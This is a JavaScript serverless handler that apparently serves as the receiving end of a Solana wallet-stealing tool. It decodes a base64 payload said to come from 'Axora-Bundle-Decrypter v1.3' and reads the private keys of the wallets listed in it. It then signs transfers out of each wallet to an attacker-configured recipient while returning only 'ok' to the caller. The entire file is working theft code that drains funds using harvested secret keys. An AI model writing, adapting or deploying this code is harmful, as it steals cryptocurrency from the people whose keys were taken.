const { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58').default; // Use .default for CommonJS compatibility

// Configuration - pulled from environment variables
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'ENTER_RECIPIENT_PUBLIC_KEY_HERE';
const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.devnet.solana.com';
const FEE_ESTIMATE = 5000; // Fallback lamports estimate
const TRANSFER_AMOUNT = 4000; // Fixed transfer amount: 0.004 SOL (4000 lamports)
const MAX_RETRIES = 5; // Max retries for RPC calls
const RETRY_DELAY_BASE = 500; // Base delay for exponential backoff (ms)

// In-memory set to prevent duplicate transfers (resets on function restart)
const processedKeys = new Set();

// Retry wrapper for RPC calls
async function withRetry(fn, maxRetries = MAX_RETRIES, baseDelay = RETRY_DELAY_BASE) {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (error.message.includes('429 Too Many Requests') && attempt < maxRetries) {
        const delay = baseDelay * Math.pow(2, attempt);
        console.log(`[retry] Server responded with 429. Retrying after ${delay}ms delay...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      throw error;
    }
  }
}

export default async function handler(req, res) {
  // Debug: Log incoming request details
  console.log('[request]', {
    method: req.method,
    query: req.query,
    body: req.body
  });

  const query = req.query || {};
  const body = (req.body && typeof req.body === 'object') ? req.body : safeParseJSON(req.body);
  
  const dParam = (query.d || (body && body.d) || '').toString();
  
  // Debug: Log dParam
  console.log('[dParam]', dParam);

  if (dParam) {
    try {
      // Clean and decode the base64 data
      const cleaned = dParam.replace(/[()]/g, '');
      console.log('[cleaned]', cleaned); // Debug
      const decoded = Buffer.from(cleaned, 'base64').toString('utf8');
      console.log('[decoded]', decoded); // Debug
      const parsedData = tryJsonParse(decoded) ?? decoded;
      
      // Log decoded data with redacted private keys
      console.log('[decoded-data]', {
        ...parsedData,
        wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
      });

      // Validate source
      if (parsedData.source !== 'Axora-Bundle-Decrypter v1.3') {
        console.log('[source-error]', `Invalid source: ${parsedData.source}`);
        return res.status(200).send('ok');
      }

      // Process private keys for SOL transfer if wallets exist
      if (parsedData?.wallets?.length > 0) {
        // Create Solana connection
        const connection = new Connection(CLUSTER_URL, 'confirmed');

        // Get blockhash once for all transactions
        let blockhash;
        await withRetry(async () => {
          const latestBlockhash = await connection.getLatestBlockhash();
          blockhash = latestBlockhash.blockhash;
        });

        for (const [index, wallet] of parsedData.wallets.entries()) {
          const privateKeyBase58 = wallet.key;
          if (!privateKeyBase58) {
            console.log(`[no-key] No valid key for wallet at index ${index}`);
            continue;
          }
          try {
            // Decode base58 to Uint8Array
            const secretKey = bs58.decode(privateKeyBase58);
            if (secretKey.length !== 64) {
              throw new Error('Invalid private key length (must be 64 bytes)');
            }

            // Create Keypair and recipient PublicKey
            const fromKeypair = Keypair.fromSecretKey(secretKey);
            const toPubkey = new PublicKey(RECIPIENT_ADDRESS);
            const pubkeyStr = fromKeypair.publicKey.toBase58();

            // Check for duplicate processing
            if (processedKeys.has(pubkeyStr)) {
              console.log(`[skip] Already processed key at index ${index}: ${pubkeyStr}`);
              continue;
            }
            processedKeys.add(pubkeyStr);

            // Get balance
            const balance = await withRetry(async () => await connection.getBalance(fromKeypair.publicKey));
            console.log(`[balance] Wallet ${index}: ${balance} lamports`); // Debug
            const totalRequired = TRANSFER_AMOUNT + FEE_ESTIMATE;
            if (balance < totalRequired) {
              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: ${totalRequired}`);
              continue;
            }

            // Create transfer transaction
            const transaction = new Transaction({
              recentBlockhash: blockhash,
              feePayer: fromKeypair.publicKey,
            });

            // Add transfer instruction with fixed amount
            transaction.add(
              SystemProgram.transfer({
                fromPubkey: fromKeypair.publicKey,
                toPubkey,
                lamports: TRANSFER_AMOUNT,
              })
            );

            // Calculate exact fee
            const fee = await withRetry(async () => await transaction.getEstimatedFee(connection)) || FEE_ESTIMATE;
            if (balance < TRANSFER_AMOUNT + fee) {
              console.error(`[error] Insufficient balance for fee from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: ${TRANSFER_AMOUNT + fee}`);
              continue;
            }

            // Send and confirm
            const signature = await withRetry(async () => await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
              maxRetries: 2,
              skipPreflight: false,
            }));
            console.log(`[success] Transferred ${TRANSFER_AMOUNT} lamports from ${pubkeyStr} (wallet ${index}) to ${toPubkey.toBase58()}. Signature: ${signature}`);
          } catch (error) {
            console.error(`[transfer-error] Failed to process SOL transfer for ${privateKeyBase58.slice(0, 8)}... (wallet ${index}): ${error.message}`);
          }
        }
      } else {
        console.log('[no-wallets]', 'No wallets found in parsed data');
      }
    } catch (e) {
      console.log('[decode-error]', e?.message || String(e));
    }
  } else {
    console.log('[no-dParam]', 'No d parameter provided in request');
  }

  // Simple response - users only see "ok"
  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send('ok');
}

function safeParseJSON(input) {
  if (!input || typeof input !== 'string') return input;
  try { return JSON.parse(input); } catch { return input; }
}

function tryJsonParse(input) {
  try { return JSON.parse(input); } catch { return null; }
}
